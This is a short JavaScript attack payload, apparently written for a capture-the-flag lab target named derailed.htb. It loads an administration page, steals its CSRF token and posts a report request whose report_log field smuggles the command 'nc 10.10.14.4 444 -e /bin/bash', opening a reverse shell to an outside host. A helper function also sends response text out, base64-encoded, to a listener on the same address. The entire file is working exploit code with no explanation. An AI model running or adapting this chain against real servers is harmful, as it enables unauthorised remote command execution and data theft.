function log(msg) {
	fetch("http://10.10.14.4:9000/?log=" + btoa(msg));
}
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function () {
    if (this.readyState == 4) {
        let doc = new DOMParser().parseFromString(xhttp.responseText, "text/html");
        let authenticity_token = doc.getElementsByName("authenticity_token")[0].value;
        var POST = new XMLHttpRequest();
        var params ="authenticity_token=" + authenticity_token + "&report_log=| nc 10.10.14.4 444 -e /bin/bash;";
        POST.onreadystatechange = function () {
            if (this.readyState == 4) {
                log(POST.responseText);
            }
        };
        POST.open("POST", "http://derailed.htb:3000/administration/reports", true);
        POST.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        POST.send(params);
    }
};
xhttp.open("GET", "http://derailed.htb:3000/administration", true);
xhttp.send();
